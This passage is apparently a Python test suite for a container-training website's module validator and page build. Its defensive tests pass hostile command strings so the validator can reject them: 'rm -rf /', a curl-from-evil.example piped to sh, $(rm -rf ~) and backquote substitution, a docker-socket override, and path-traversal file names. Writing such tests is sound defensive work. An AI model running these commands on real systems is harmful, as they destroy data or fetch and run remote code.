"""Tests for Podbag Training: the module rules, the catalog and the /training/ pages.

usage: python3 -m unittest dev/docs/test_training.py
"""
import collections
import copy
import importlib.util
import itertools
import json
import os
import re
import sys
import tempfile
import unittest
from hashlib import sha256
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
import check_links  # noqa: E402
import training  # noqa: E402

SOURCE = HERE.parents[1] / "site" / "training"
IDS = json.loads((SOURCE / "catalog.json").read_text())["modules"]
TUI = json.loads((SOURCE / "tui.json").read_text())
GUI = json.loads((SOURCE / "gui.json").read_text())
# The usage tabs: their folder under /training/ and their source.
USAGE = {"gui": GUI, "tui": TUI}


def html_text(fragment):
    """FRAGMENT's text: no tags, entities read."""
    import html as markup
    return markup.unescape(re.sub(r"<[^>]+>", "", fragment))


def html_escape(text):
    import html as markup
    return markup.escape(text)


def course():
    return json.loads((SOURCE / "modules/web-basics.podbag").read_text())


def encode(module):
    return json.dumps(module).encode()


UI_STEPS = {  # module → {step key: (action, name)}, the table of the plan
    "container-changes": {
        "remove": ("remove", "app"),
        "removeImage": ("remove-image", "app-snapshot:1"),
    },
    "container-exec": {"remove": ("remove", "app")},
    "container-lifecycle": {
        "start": ("start", "app"),
        "stop": ("stop", "app"),
        "restart": ("restart", "app"),
        "remove": ("remove", "app"),
    },
    "container-network": {
        "remove": ("remove", "web"),
        "removeApi": ("remove", "api"),
        "deleteNetwork": ("remove-network", "lab-net"),
    },
    "copy-and-archive": {
        "remove": ("remove", "app"),
        "removeImage": ("remove-image", "docker.io/library/busybox:1.37.0"),
    },
    "docker-cli": {
        "pull": ("pull", "docker.io/library/busybox:1.37.0"),
        "stop": ("stop", "web"),
        "remove": ("remove", "web"),
    },
    "health-checks": {"remove": ("remove", "web")},
    "image-basics": {
        "pull": ("pull", "docker.io/library/busybox:1.37.0"),
        "removeTag": ("remove-image", "my-busybox:1"),
        "removeImage": ("remove-image", "docker.io/library/busybox:1.37.0"),
    },
    "image-build": {"remove": ("remove", "web"), "removeImage": ("remove-image", "my-site:1")},
    "local-registry": {
        "pull": ("pull", "docker.io/library/busybox:1.37.0"),
        "removeTag": ("remove-image", "127.0.0.1:{port}/training/busybox:1"),
        "pullBack": ("pull", "127.0.0.1:{port}/training/busybox:1"),
        "removeRegistry": ("remove", "registry"),
    },
    "network-connect": {
        "stopApi": ("stop", "api"),
        "startApi": ("start", "api"),
        "stopAgain": ("stop", "api"),
        "removeApi": ("remove", "api"),
        "removeNetworks": ("remove-network", "back-net"),
    },
    "pause-and-rename": {
        "pause": ("pause", "web"),
        "unpause": ("resume", "web"),
        "remove": ("remove", "site"),
    },
    "resource-limits": {"remove": ("remove", "app")},
    "restart-policies": {
        "logsJob": ("logs", "job"),
        "removeJob": ("remove", "job"),
        "stopApp": ("stop", "app"),
        "startApp": ("start", "app"),
        "removeApp": ("remove", "app"),
    },
    "system-checks": {
        "pull": ("pull", "docker.io/library/busybox:1.37.0"),
        "removeImage": ("remove-image", "docker.io/library/busybox:1.37.0"),
    },
    "volume-persistence": {
        "create": ("create-volume", "training-data"),
        "removeWriter": ("remove", "app-a"),
        "removeReader": ("remove", "app-b"),
    },
    "web-basics": {"remove": ("remove", "lab-web")},
    "web-service-lifecycle": {
        "create": ("create-volume", "site-data"),
        "remove": ("remove", "site-v1"),
        "removeReplacement": ("remove", "site-v2"),
    },
    "web-service-recovery": {
        "readRecoveryLogs": ("logs", "lab-web"),
        "removeFailed": ("remove", "lab-web"),
        "remove": ("remove", "lab-web"),
    },
}

TRACK_LINES = {"en": ("- **In Podbag Desktop:**", "- **In the TUI:**"),
               "ko": ("- **Podbag Desktop에서:**", "- **TUI에서:**"),
               "ja": ("- **Podbag Desktop で:**", "- **TUI で:**"),
               "zh-CN": ("- **在 Podbag Desktop 中：**", "- **在 TUI 中：**"),
               "fil": ("- **Sa Podbag Desktop:**", "- **Sa TUI:**"),
               "es": ("- **En Podbag Desktop:**", "- **En la TUI:**"),
               "vi": ("- **Trong Podbag Desktop:**", "- **Trong TUI:**")}


class Rules(unittest.TestCase):
    def refuse(self, module, words, name="web-basics"):
        raw = module if isinstance(module, bytes) else encode(module)
        with self.assertRaises(training.Invalid) as caught:
            training.check(raw, name)
        self.assertIn(words, str(caught.exception))

    def test_every_source_module_passes(self):
        files = sorted(f.stem for f in (SOURCE / "modules").glob("*.podbag"))
        self.assertEqual(sorted(IDS), files, "every module file is in catalog.json, once")
        for name in IDS:
            module = training.check((SOURCE / f"modules/{name}.podbag").read_bytes(), name)
            self.assertTrue(module["translations"]["en"]["title"])

    def test_a_command_that_is_not_podbag(self):
        module = course()
        module["steps"][0]["command"] = "rm -rf /"
        self.refuse(module, "must be exit or start with 'podbag '")

    def test_a_command_with_a_control_character(self):
        module = course()
        module["steps"][0]["command"] = "podbag ps\nrm -rf /"
        self.refuse(module, "control character")

    def test_a_guide_on_another_site(self):
        module = course()
        module["translations"]["ko"]["url"] = "https://evil.example/"
        self.refuse(module, "must start with https://podbag.dev/")

    def test_a_key_used_twice(self):
        module = course()
        module["steps"][1]["key"] = module["steps"][0]["key"]
        self.refuse(module, "the key is used twice")

    def test_a_bad_key(self):
        module = course()
        module["steps"][0]["key"] = "run-web"
        self.refuse(module, "key 'run-web'")

    def test_a_step_without_an_english_name(self):
        module = course()
        del module["steps"][0]["names"]["en"]
        self.refuse(module, "no names.en")

    def test_the_last_step_is_not_finish(self):
        module = course()
        module["steps"].pop()
        self.refuse(module, "the last step must be key finish")

    def test_a_desktop_step_with_a_command(self):
        module = course()
        module["steps"][1]["command"] = "podbag ps"
        self.refuse(module, "a Desktop step has no command")

    def with_ui(self, key, ui, name="web-basics"):
        module = course()
        next(s for s in module["steps"] if s["key"] == key)["ui"] = ui
        return encode(module)

    def test_ui_rules(self):
        training.check(self.with_ui("remove", {"action": "remove", "name": "lab-web"}), "web-basics")
        for why, key, ui in [
            ("wrong check", "remove", {"action": "stop", "name": "lab-web"}),
            ("desktop step", "stop", {"action": "stop", "name": "lab-web"}),
            ("unknown action", "remove", {"action": "kill", "name": "lab-web"}),
            ("empty name", "remove", {"action": "remove", "name": " "}),
            ("space in name", "remove", {"action": "remove", "name": "lab web"}),
            ("not an object", "remove", "remove lab-web"),
            ("open-web is the app's", "remove", {"action": "open-web", "name": "lab-web"}),
            ("too long", "remove", {"action": "remove", "name": "a" * 201}),
            ("control character", "remove", {"action": "remove", "name": "lab\x07web"}),
            ("prune of a name", "remove", {"action": "prune", "name": "lab-web"}),
        ]:
            with self.subTest(why):
                self.refuse(self.with_ui(key, ui), "the ui cannot do this step")

    def test_ui_name_with_a_port(self):
        ui = {"action": "remove", "name": "web-{port}"}
        training.check(self.with_ui("remove", ui), "web-basics")
        module = json.loads(json.dumps(course()).replace("{port}", "8080"))  # only the ui has it
        del module["port"]
        next(s for s in module["steps"] if s["key"] == "remove")["ui"] = ui
        self.refuse(module, "the ui cannot do this step")

    def test_the_ui_rules_are_the_apps(self):
        """The same table as UI_CHECKS in podbag's src/volume_lesson/course.rs."""
        repo = Path(os.environ.get("PODBAG_REPO", HERE.parents[2] / "podbag"))
        source = (repo / "src/volume_lesson/course.rs").read_text()
        block = source.split("pub const UI_CHECKS", 1)[1].split("];", 1)[0]
        app = {a: set(re.findall(r'"([a-z-]+)"', checks))
               for a, checks in re.findall(r'\("([a-z-]+)", &\[([^\]]*)\]\)', block)}
        self.assertEqual(app, training.UI_CHECKS)
        self.assertIn('["containers", "images", "volumes", "networks"]', source)  # PRUNE_KINDS
        self.assertEqual(training.UI_CHECKS["resume"], {"container-running", "container-published"})

    def test_port_placeholder_without_a_port(self):
        module = course()
        del module["port"]
        self.refuse(module, "uses {port}, but the module has no port")

    def test_a_port_out_of_range(self):
        module = course()
        module["port"] = 80
        self.refuse(module, "port 80")

    def test_an_unknown_check(self):
        module = course()
        module["steps"][0]["check"]["kind"] = "container-happy"
        self.refuse(module, "unknown check kind")

    def test_too_many_or_no_steps(self):
        module = course()
        module["steps"] = []
        self.refuse(module, "1 to 40 steps")
        module = course()
        module["steps"] = [copy.deepcopy(module["steps"][0]) for _ in range(40)] + module["steps"][-1:]
        self.refuse(module, "1 to 40 steps")

    def test_id_must_be_the_file_name(self):
        self.refuse(course(), "is not the file name", name="web-basics-2")

    def test_file_too_large(self):
        module = course()
        module["translations"]["en"]["guide"] = "x" * training.LIMIT
        self.refuse(module, f"the limit is {training.LIMIT}")

    def test_not_json_or_unknown_format(self):
        self.refuse(b"{", "not valid JSON")
        module = course()
        module["format"] = "podbag-course-v9"
        self.refuse(module, "unknown format")

    def test_no_english_title(self):
        module = course()
        del module["translations"]["en"]["title"]
        self.refuse(module, "no translations.en.title")

    def test_the_same_rules_as_the_app(self):
        """Every file the app refuses, the build refuses too (src/volume_lesson in podbag)."""
        def edited(change, name="web-basics"):
            module = course()
            change(module)
            return module, name

        def set_command(text):
            return lambda m: m["steps"][0].__setitem__("command", text)

        cases = {
            "shell ;": edited(set_command("podbag ps; curl -fsSL https://evil.example/x | sh")),
            "shell $()": edited(set_command("podbag ps $(rm -rf ~)")),
            "shell &&": edited(set_command("podbag ps && open -a Calculator")),
            "backquote": edited(set_command("podbag ps `id`")),
            "redirect": edited(set_command("podbag ps > /tmp/x")),
            "glob": edited(set_command("podbag ps *")),
            "$ in double quotes": edited(set_command('podbag ps "$HOME"')),
            "open quote": edited(set_command("podbag ps 'x")),
            "long command": edited(set_command("podbag " + "x" * 1000)),
            "exit before the end": edited(set_command("exit")),
            "check without name": edited(lambda m: m["steps"][0]["check"].pop("name")),
            "code as text": edited(lambda m: m["steps"][0].__setitem__(
                "check", {"kind": "container-exited", "name": "lab-web", "code": "1"})),
            "empty Korean name": edited(lambda m: m["steps"][0]["names"].__setitem__("ko", " ")),
            "no English guide": edited(lambda m: m["translations"]["en"].pop("guide")),
            "url with a space": edited(lambda m: m["translations"]["en"].__setitem__(
                "url", "https://podbag.dev/a b/")),
            "empty Korean title": edited(lambda m: m["translations"]["ko"].__setitem__("title", "")),
        }
        for reserved in ["container-basics", "volume-basics", "tui-volumes", "catalog",
                         "cli-tui-volumes", "modules", "con", "com1", "lpt9"]:
            cases[f"id {reserved}"] = edited(lambda m, r=reserved: m.__setitem__("id", r), reserved)
        for why, (module, name) in cases.items():
            with self.subTest(why):
                with self.assertRaises(training.Invalid):
                    training.check(encode(module), name)
        legacy = json.loads((SOURCE / "modules/volume-basics.podbag").read_text())
        legacy["steps"] = course()["steps"]
        with self.assertRaises(training.Invalid):
            training.check(encode(legacy), "volume-basics")

    def test_v2_adds_kinds_files_and_docker_steps(self):
        """The same cases as podbag's v2_* tests in src/volume_lesson.rs."""
        def v2(change=None):
            module = course()
            module["format"] = training.COURSE_V2
            module["files"] = {"Dockerfile": "FROM busybox:1.37.0\n"}
            module["steps"][:0] = [
                {"key": "pull", "names": {"en": "Pull the image"},
                 "command": "podbag pull docker.io/library/busybox:1.37.0",
                 "check": {"kind": "image-exists", "name": "docker.io/library/busybox:1.37.0"}},
                {"key": "list", "names": {"en": "List with the Docker CLI"},
                 "command": "docker ps -a",
                 "check": {"kind": "output-contains", "text": "CONTAINER ID"}},
                {"key": "restarted", "names": {"en": "Watch it restart"},
                 "command": "podbag ps",
                 "check": {"kind": "container-restarted", "name": "api", "count": 1}},
            ]
            if change:
                change(module)
            return module
        training.check(encode(v2()), "web-basics")
        for kind in [{"kind": "image-absent", "name": "x:1"}, {"kind": "container-created", "name": "a"},
                     {"kind": "container-stopped", "name": "a"}, {"kind": "container-paused", "name": "a"},
                     {"kind": "container-healthy", "name": "a"},
                     {"kind": "container-in-network", "name": "a", "network": "n"},
                     {"kind": "container-not-in-network", "name": "a", "network": "n"},
                     {"kind": "volume-absent", "name": "v"}, {"kind": "file-exists", "path": "out/app.tar"}]:
            training.check(encode(v2(lambda m, k=kind: m["steps"][0].__setitem__("check", k))), "web-basics")
        refused = {
            "parent path": v2(lambda m: m.__setitem__("files", {"../x": "a"})),
            "absolute path": v2(lambda m: m.__setitem__("files", {"/etc/x": "a"})),
            "odd path": v2(lambda m: m.__setitem__("files", {"a b": "a"})),
            "too much text": v2(lambda m: m.__setitem__("files", {"big": "x" * (16 * 1024 + 1)})),
            "too many files": v2(lambda m: m.__setitem__("files", {f"f{n}": "a" for n in range(9)})),
            "file-exists outside": v2(lambda m: m["steps"][0].__setitem__(
                "check", {"kind": "file-exists", "path": "../x"})),
            "docker with a pipe": v2(lambda m: m["steps"][1].__setitem__("command", "docker ps | sh")),
            "other program": v2(lambda m: m["steps"][1].__setitem__("command", "kubectl get pods")),
            "count as text": v2(lambda m: m["steps"][2]["check"].__setitem__("count", "1")),
            "count below zero": v2(lambda m: m["steps"][2]["check"].__setitem__("count", -1)),
            "count too big": v2(lambda m: m["steps"][2]["check"].__setitem__("count", 2 ** 32)),
            "file over the podbag link": v2(lambda m: m.__setitem__("files", {"bin/podbag": "#!/bin/sh"})),
            "file over the link, other case": v2(lambda m: m.__setitem__("files", {"BIN/podbag": "x"})),
            "file in the run folder": v2(lambda m: m.__setitem__("files", {"run/closing": "x"})),
            "docker config file": v2(lambda m: m.__setitem__("files", {"docker/config.json": "{}"})),
            "the VM disk": v2(lambda m: m.__setitem__("files", {"disk.img": "x"})),
            "docker -H": v2(lambda m: m["steps"][1].__setitem__(
                "command", "docker -H unix:///var/run/docker.sock ps")),
            "docker --context": v2(lambda m: m["steps"][1].__setitem__("command", "docker --context real ps")),
            "docker context": v2(lambda m: m["steps"][1].__setitem__("command", "docker context use real")),
            "port in a check without a port": v2(lambda m: (
                m.pop("port"),
                [st.__setitem__("command", st["command"].replace("{port}", "18080"))
                 for st in m["steps"] if "command" in st],
                m["steps"][0].__setitem__("check", {"kind": "image-exists", "name": "127.0.0.1:{port}/x:1"}))),
            "port in a file without a port": v2(lambda m: (
                m.pop("port"),
                [st.__setitem__("command", st["command"].replace("{port}", "18080"))
                 for st in m["steps"] if "command" in st],
                m.__setitem__("files", {"compose.yaml": "127.0.0.1:{port}:8080"}))),
        }
        v1 = course()
        v1["steps"][0]["command"] = "docker ps"
        refused["v1 docker"] = v1
        v1 = course()
        v1["files"] = {"a": "b"}
        refused["v1 files"] = v1
        v1 = course()
        v1["steps"][0]["check"] = {"kind": "image-exists", "name": "x:1"}
        refused["v1 new kind"] = v1
        for why, module in refused.items():
            with self.subTest(why), self.assertRaises(training.Invalid):
                training.check(encode(module), "web-basics")

    def test_every_module_needs_a_time(self):
        with tempfile.TemporaryDirectory() as tmp:
            folder = Path(tmp)
            (folder / "modules").mkdir()
            (folder / "modules/web-basics.podbag").write_bytes(
                (SOURCE / "modules/web-basics.podbag").read_bytes())
            for minutes in [{}, {"web-basics": []}, {"web-basics": [15, 10]},
                            {"web-basics": ["10"]}, {"web-basics": [0]}]:
                (folder / "catalog.json").write_text(
                    json.dumps({"modules": ["web-basics"], "minutes": minutes}))
                with self.assertRaises(SystemExit, msg=minutes):
                    training.load(folder)
            (folder / "catalog.json").write_text(
                json.dumps({"modules": ["web-basics"], "minutes": {"web-basics": [10, 15]}}))
            self.assertEqual(training.load(folder)[0][0], "web-basics")

    def test_older_formats_keep_their_app_ids(self):
        raw = (SOURCE / "modules/volume-basics.podbag").read_bytes()
        training.check(raw, "volume-basics")
        with self.assertRaises(training.Invalid):
            training.check(raw, "tui-volumes")

    def test_the_tui_has_no_practice_module(self):
        """The TUI is shown as a guide (/training/tui/), not practised in a module."""
        self.assertNotIn("tui-volumes", IDS)
        self.assertFalse((SOURCE / "modules/tui-volumes.podbag").exists())

    def test_a_bad_tui_list_stops_the_build(self):
        langs = ["en", "ko"]
        good = {"guides": ["tui-start"], "minutes": {"tui-start": 5},
                "keys": [{"keys": ["q"], "words": {"en": "Quit", "ko": "끝내기"}}]}
        self.assertEqual(training.load_usage(good, langs, "tui")["guides"], ["tui-start"])
        for change, words in [
            (lambda t: t.update(guides=[]), "guides"),
            (lambda t: t.update(guides=["Bad slug"]), "bad guide"),
            (lambda t: t.update(guides=["tui-start", "tui-start"]), "twice"),
            (lambda t: t.update(minutes={}), "minutes of tui-start"),
            (lambda t: t["keys"][0]["words"].pop("ko"), "ko"),
            (lambda t: t["keys"][0].update(keys=[]), "keys"),
        ]:
            tui = copy.deepcopy(good)
            change(tui)
            with self.subTest(words), self.assertRaises(SystemExit) as caught:
                training.load_usage(tui, langs, "tui")
            self.assertIn(words, str(caught.exception))
            self.assertIn("site/training/tui.json", str(caught.exception))

    def test_a_bad_gui_list_stops_the_build(self):
        langs = ["en", "ko"]
        good = {"guides": ["gui-start"], "minutes": {"gui-start": 5},
                "pages": [{"names": {"en": "Images", "ko": "이미지"},
                           "words": {"en": "Pull images", "ko": "이미지 받기"}}]}
        self.assertEqual(training.load_usage(good, langs, "gui")["guides"], ["gui-start"])
        for change, words in [
            (lambda g: g.update(guides=[]), "guides"),
            (lambda g: g.update(minutes={"gui-start": 0}), "minutes of gui-start"),
            (lambda g: g.update(pages=[]), "pages"),
            (lambda g: g["pages"][0]["names"].pop("ko"), "page row 1 has no ko name"),
            (lambda g: g["pages"][0]["words"].pop("en"), "page row 1 has no en words"),
        ]:
            gui = copy.deepcopy(good)
            change(gui)
            with self.subTest(words), self.assertRaises(SystemExit) as caught:
                training.load_usage(gui, langs, "gui")
            self.assertIn(words, str(caught.exception))
            self.assertIn("site/training/gui.json", str(caught.exception))

    def test_a_bad_module_stops_the_build(self):
        with tempfile.TemporaryDirectory() as tmp:
            folder = Path(tmp)
            (folder / "modules").mkdir()
            module = course()
            module["steps"][0]["command"] = "rm -rf /"
            (folder / "modules/web-basics.podbag").write_bytes(encode(module))
            (folder / "catalog.json").write_text(
                '{"modules": ["web-basics"], "minutes": {"web-basics": [10]}}')
            with self.assertRaises(SystemExit) as caught:
                training.load(folder)
            self.assertIn("modules/web-basics.podbag: step 1 (runWeb)", str(caught.exception))
            (folder / "catalog.json").write_text(
                '{"modules": ["web-basics", "missing"], "minutes": {"web-basics": [10], "missing": [10]}}')
            (folder / "modules/web-basics.podbag").write_bytes(encode(course()))
            with self.assertRaises(SystemExit) as caught:
                training.load(folder)
            self.assertIn("no file modules/missing.podbag", str(caught.exception))


class UiSteps(unittest.TestCase):
    def test_ui_steps(self):
        found = {}
        for name in IDS:
            module = json.loads((SOURCE / f"modules/{name}.podbag").read_text())
            for step in module.get("steps", []):
                if "ui" in step:
                    found.setdefault(name, {})[step["key"]] = (step["ui"]["action"], step["ui"]["name"])
        self.assertEqual(found, UI_STEPS)
        self.assertEqual(sum(len(v) for v in found.values()), 51)
        self.assertEqual(found["pause-and-rename"]["unpause"], ("resume", "web"))

    def test_ui_keeps_the_format(self):
        """Released apps read the files: the format strings do not change."""
        formats = collections.Counter()
        for name in IDS:
            module = json.loads((SOURCE / f"modules/{name}.podbag").read_text())
            self.assertIn(module["format"], {*training.COURSES, *training.LEGACY}, name)
            formats[module["format"]] += 1
        # Exact counts, as on origin/main on 2026-11-27 (a new module changes them on purpose).
        self.assertEqual(formats, {"podbag-course-v1": 5, "podbag-course-v2": 16,
                                   "podbag-container-basics-v1": 1, "podbag-cli-gui-volumes-v1": 1})


class Built(unittest.TestCase):
    """Build the whole site once and look at the catalog and the training pages."""

    @classmethod
    def setUpClass(cls):
        spec = importlib.util.spec_from_file_location("podbag_site", HERE / "site.py")
        cls.site = importlib.util.module_from_spec(spec)
        sys.modules["podbag_site"] = cls.site
        spec.loader.exec_module(cls.site)
        cls.tmp = tempfile.TemporaryDirectory()
        cls.out = Path(cls.tmp.name) / "site"
        argv = sys.argv
        sys.argv = ["site.py", str(cls.out)]
        try:
            cls.site.main()
        finally:
            sys.argv = argv

    @classmethod
    def tearDownClass(cls):
        cls.tmp.cleanup()

    def test_catalog_lists_every_module_in_order(self):
        served = json.loads((self.out / "training/catalog.json").read_text())
        self.assertEqual(served["format"], "podbag-training-catalog-v1")
        self.assertEqual([m["id"] for m in served["modules"]], IDS)
        for entry in served["modules"]:
            name = entry["id"]
            self.assertEqual(entry["file"], f"modules/{name}.podbag")
            raw = (SOURCE / entry["file"]).read_bytes()
            self.assertEqual((self.out / "training" / entry["file"]).read_bytes(), raw)
            self.assertEqual(entry["sha256"], sha256(raw).hexdigest())

    def test_every_language_lists_every_module(self):
        for code, _ in self.site.LANGS:
            page = self.out / self.site.path_of(code) / "training/index.html"
            html = page.read_text()
            starts = re.findall(r"podbag lab start ([a-z0-9-]+)</code>", html)
            self.assertEqual(starts, IDS, code)
            for name in IDS:
                item = re.search(rf'<li class="post-card module reveal" id="{name}">(.*?)</li>', html).group(1)
                module = json.loads((SOURCE / f"modules/{name}.podbag").read_text())
                words = module["translations"].get(code) or module["translations"]["en"]
                self.assertIn(training.short_title(words["title"]), item.replace("&#x27;", "'"))
                picture, guide, download = re.findall(r'<a [^>]*href="([^"]+)"', item)
                self.assertEqual(picture, guide)
                self.assertTrue((page.parent / guide / "index.html").is_file(), (code, guide))
                self.assertTrue((page.parent / download).samefile(
                    self.out / "training/modules" / f"{name}.podbag"))
                # A plain list: no numbers before the modules, no step counts.
                self.assertNotIn("module-number", item)
                if module["format"] in training.COURSES:
                    self.assertNotIn(f">{len(module['steps'])} ", item)
            self.assertIn('<ul class="modules"', html)

    def test_cards_show_both_tracks(self):
        for code, _ in self.site.LANGS:
            html = (self.out / self.site.path_of(code) / "training/index.html").read_text()
            words = json.loads((HERE.parents[1] / f"site/i18n/{code}.json").read_text())
            for name in IDS:
                item = re.search(rf'<li class="post-card module reveal" id="{name}">(.*?)</li>', html).group(1)
                module = json.loads((SOURCE / f"modules/{name}.podbag").read_text())
                with self.subTest(code=code, name=name):
                    self.assertIn(f"podbag lab start {name}</code>", item)
                    if module["format"] in training.COURSES:
                        self.assertIn(f"podbag lab start {name} --tui</code>", item)
                        self.assertIn(html_escape(words["training_tracks_note"]), item)
                    else:
                        self.assertNotIn("--tui", item)

    def test_each_module_is_a_card_like_the_blog_list(self):
        """Every module is a card like the blog's lists: its guide's picture, the title linking
        to the guide, and the guide's summary, in the page's language."""
        posts = HERE.parents[1] / "site/blog/posts"
        for code, _ in self.site.LANGS:
            page = self.out / self.site.path_of(code) / "training/index.html"
            html = page.read_text()
            for name in IDS:
                with self.subTest(code=code, name=name):
                    item = re.search(rf'<li class="post-card module reveal" id="{name}">(.*?)</li>',
                                     html).group(1)
                    self.assertTrue(item.startswith('<a class="thumb"'), item[:80])
                    src = re.search(r'<img src="([^"]+)"', item).group(1)
                    self.assertTrue((page.parent / src).is_file(), src)
                    self.assertRegex(item, r'<img [^>]*width="\d+" height="\d+"')
                    title = re.search(r'<h3 class="post-title"><a href="([^"]+)">', item)
                    self.assertTrue((page.parent / title.group(1) / "index.html").is_file())
                    slug = Path(title.group(1).rstrip("/")).name
                    text = (posts / slug / f"{code}.md").read_text()
                    # The same picture as the blog's lists: the post's image, or its card.
                    image = re.search(r'^image: "?(.*?)"?$', text, re.M)
                    picture = image.group(1) if image else f"card-{code}.png"
                    self.assertEqual(Path(src).parts[-3:], ("blog", slug, picture))
                    summary = re.search(r'^summary: "?(.*?)"?$', text, re.M).group(1)
                    words = re.sub(r"[`*]", "", summary).split()[:3]
                    plain = re.sub(r"<[^>]+>", "", item).replace("&#x27;", "'").replace("&quot;", '"')
                    self.assertIn(" ".join(words), plain)

    def test_each_module_shows_its_time(self):
        en = (self.out / "training/index.html").read_text()
        ko = (self.out / "ko/training/index.html").read_text()
        item = lambda html, name: re.search(  # noqa: E731
            rf'<li class="post-card module reveal" id="{name}">(.*?)</li>', html).group(1)
        self.assertIn("About 10 min", item(en, "web-basics"))
        self.assertIn("About 10–15 min", item(en, "container-network"))
        self.assertIn("약 15분", item(ko, "volume-persistence"))
        self.assertIn("약 10~15분", item(ko, "web-service-recovery"))
        for code, _ in self.site.LANGS:
            html = (self.out / self.site.path_of(code) / "training/index.html").read_text()
            for name in IDS:
                self.assertRegex(item(html, name), r"\d", (code, name))

    def test_every_module_speaks_every_language(self):
        """Each module's guide is written, and its title given, in all seven languages; each
        translation's guide link is that language's page."""
        posts = HERE.parents[1] / "site/blog/posts"
        langs = [code for code, _ in self.site.LANGS]
        for name in IDS:
            module = json.loads((SOURCE / f"modules/{name}.podbag").read_text())
            words = module["translations"]
            with self.subTest(name):
                self.assertEqual(sorted(words), sorted(langs))
                if module["format"] in training.COURSES:
                    slug = words["en"]["url"].rstrip("/").rsplit("/", 1)[1]
                    for code in langs:
                        self.assertEqual(words[code]["url"],
                                         f"https://podbag.dev/{self.site.path_of(code)}blog/{slug}/")
                else:
                    slug = training.LEGACY_GUIDES[name]
                for code in langs:
                    self.assertTrue((posts / slug / f"{code}.md").is_file(), (slug, code))

    def test_every_guide_opens_with_its_architecture(self):
        """The first picture of a Training guide, before its first section, shows what the
        module builds, in both themes."""
        posts = HERE.parents[1] / "site/blog/posts"
        slugs = set(training.LEGACY_GUIDES.values())
        for name in IDS:
            module = json.loads((SOURCE / f"modules/{name}.podbag").read_text())
            if module["format"] in training.COURSES:
                slugs.add(module["translations"]["en"]["url"].rstrip("/").rsplit("/", 1)[1])
        for slug in sorted(slugs):
            for page in sorted((posts / slug).glob("*.md")):
                body = page.read_text().split("\n---\n", 1)[1]
                opening = body.split("\n## ", 1)[0]
                first = re.search(r"!\[([^\]]+)\]\(([^) ]+)", body)
                with self.subTest(page=f"{slug}/{page.name}"):
                    self.assertIsNotNone(first)
                    alt, src = first.groups()
                    self.assertIn(first.group(0), opening, "before the first section")
                    self.assertRegex(src, r"^architecture(-[a-zA-Z-]+)?-light\.svg$")
                    self.assertTrue((posts / slug / src).is_file())
                    self.assertTrue((posts / slug / src.replace("-light.svg", "-dark.svg")).is_file())
                    self.assertGreater(len(alt), 20, "the alt text says what the picture shows")

    def test_guides_show_both_tracks(self):
        """Every language's guide starts both tracks and name, for each step done in a
        UI, what to click in Podbag Desktop and what to press in the TUI."""
        posts = HERE.parents[1] / "site/blog/posts"
        for name in IDS:
            module = json.loads((SOURCE / f"modules/{name}.podbag").read_text())
            if module["format"] not in training.COURSES:
                continue
            slug = module["translations"]["en"]["url"].rstrip("/").rsplit("/", 1)[1]
            ui_steps = sum(1 for s in module["steps"]
                           if "ui" in s or s["check"]["kind"].startswith("desktop-"))
            for lang, (desktop, tui) in TRACK_LINES.items():
                with self.subTest(name=name, lang=lang):
                    text = (posts / slug / f"{lang}.md").read_text()
                    self.assertIn(f"podbag lab start {name} --tui", text)
                    lines = text.splitlines()
                    # Exactly one line per track for each ui or desktop-* step.
                    self.assertEqual(sum(l.startswith(desktop) for l in lines), ui_steps)
                    self.assertEqual(sum(l.startswith(tui) for l in lines), ui_steps)

    def test_the_page_names_what_practice_sessions_leave_out(self):
        usage = "https://github.com/SteelCrab/podbag/blob/main/docs/usage.md"
        en = (self.out / "training/index.html").read_text()
        self.assertIn("Not in the practice session", en)
        self.assertIn("Kubernetes", en)
        for code, _ in self.site.LANGS:
            page = (self.out / self.site.path_of(code) / "training/index.html").read_text()
            self.assertIn(f'href="{usage}"', page, code)

    def test_the_blog_links_to_training(self):
        for code, _ in self.site.LANGS:
            path = self.site.path_of(code)
            blog = (self.out / path / "blog/index.html").read_text()
            target = "../" * (path.count("/") + 1) + path + "training/"
            nav = re.search(r'<nav class="band-nav"[^>]*>(.*?)</nav>', blog).group(1)
            self.assertIn(f'href="{target}"', nav, code)
            side = re.search(r'<aside class="side".*?</aside>', blog, re.S).group(0)
            self.assertIn(f'href="{target}"', side, code)
            self.assertTrue((self.out / path / "training/index.html").is_file())

    def test_architecture_pictures_are_up_to_date(self):
        """The committed pictures are what dev/docs/training_diagrams.py draws."""
        import training_diagrams
        posts = HERE.parents[1] / "site/blog/posts"
        for (guide, name), text in training_diagrams.pictures().items():
            with self.subTest(f"{guide}/{name}"):
                self.assertEqual((posts / guide / name).read_text(), text,
                                 "run python3 dev/docs/training_diagrams.py")

    def test_guides_follow_the_page_language(self):
        ko = (self.out / "ko/training/index.html").read_text()
        ja = (self.out / "ja/training/index.html").read_text()
        self.assertIn('href="../../ko/blog/container-basics/"', ko)
        self.assertIn('href="../../ja/blog/container-basics/"', ja)
        self.assertIn('href="../../ja/blog/cli-tui-volumes/"', ja)
        self.assertIn('href="../../ko/blog/web-basics/"', ko)
        self.assertIn('href="../../ja/blog/web-basics/"', ja)

    def test_pages_name_each_other(self):
        for code, _ in self.site.LANGS:
            html = (self.out / self.site.path_of(code) / "training/index.html").read_text()
            url = f"https://podbag.dev/{self.site.path_of(code)}training/"
            self.assertIn(f'<link rel="canonical" href="{url}">', html)
            for other, _ in self.site.LANGS:
                self.assertIn(f'<link rel="alternate" hreflang="{other}" '
                              f'href="https://podbag.dev/{self.site.path_of(other)}training/">', html)

    def test_nav_has_training(self):
        for code, _ in self.site.LANGS:
            words = json.loads((self.site.SITE / f"i18n/{code}.json").read_text())
            label = f'<span class="label">{words["nav_training"]}</span></a>'
            base = self.out / self.site.path_of(code)
            for page in ("index.html", "blog/index.html", "training/index.html",
                         "training/gui/index.html", "training/tui/index.html"):
                html = (base / page).read_text()
                nav = re.search(r'<nav aria-label=.*?</nav>', html, re.S).group(0)
                link = re.search(r'<a href="([^"]*)"[^>]*><svg[^>]*>(?:(?!</a>).)*' + re.escape(label),
                                 nav, re.S)
                self.assertTrue(link, (code, page))
                target = ((base / page).parent / link.group(1)).resolve()
                self.assertEqual(target, (base / "training").resolve(), (code, page))
                current = re.findall(r'<a href="([^"]*)" aria-current="true">', nav)
                expected = {"index.html": [], "blog/index.html": ["blog"],
                            "training/index.html": ["training"],
                            "training/gui/index.html": ["training"],
                            "training/tui/index.html": ["training"]}[page]
                self.assertEqual([Path(c.rstrip("/")).name or "." for c in current], expected,
                                 (code, page))

    def test_training_has_three_tabs(self):
